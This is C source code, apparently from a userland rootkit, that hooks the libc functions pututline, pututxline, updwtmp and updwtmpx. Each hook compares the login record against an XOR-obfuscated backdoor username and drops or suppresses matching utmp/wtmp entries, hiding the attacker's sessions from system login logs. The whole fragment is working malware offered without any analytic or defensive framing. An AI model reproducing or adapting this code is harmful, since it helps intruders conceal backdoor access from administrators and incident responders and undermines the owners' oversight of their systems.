struct utmp *pututline(const struct utmp *ut)
{
    HOOK(o_pututline,CPUTUTLINE);
    struct utmp *tmp=o_pututline(ut);

    if(tmp && tmp->ut_user != NULL)
    {
        char *bduname=strdup(BD_UNAME); xor(bduname);
        if(!strcmp((char *)tmp->ut_user,bduname)) { CLEAN(bduname); return NULL; }
        CLEAN(bduname);
    }

    return o_pututline(ut);
}

struct utmpx *pututxline(const struct utmpx *utx)
{
    HOOK(o_pututxline,CPUTUTXLINE);
    struct utmpx *tmp=o_pututxline(utx);

    if(tmp && tmp->ut_user != NULL)
    {
        char *bduname=strdup(BD_UNAME); xor(bduname);
        if(!strcmp((char *)tmp->ut_user,bduname)) { CLEAN(bduname); return NULL; }
        CLEAN(bduname);
    }

    return o_pututxline(utx);
}

void updwtmp(const char *wfile, const struct utmp *ut)
{
    if(ut && ut->ut_user != NULL)
    {
        char *bduname=strdup(BD_UNAME); xor(bduname);
        if(!strcmp((char *)ut->ut_user,bduname)) { CLEAN(bduname); return; }
        CLEAN(bduname);
    }

    HOOK(o_updwtmp,CUPDWTMP);
    o_updwtmp(wfile,ut);
}

void updwtmpx(const char *wfilex, const struct utmpx *utx)
{
    if(utx && utx->ut_user != NULL)
    {
        char *bduname=strdup(BD_UNAME); xor(bduname);
        if(!strcmp((char *)utx->ut_user,bduname)) { CLEAN(bduname); return; }
        CLEAN(bduname);
    }

    HOOK(o_updwtmpx,CUPDWTMPX);
    o_updwtmpx(wfilex,utx);
}
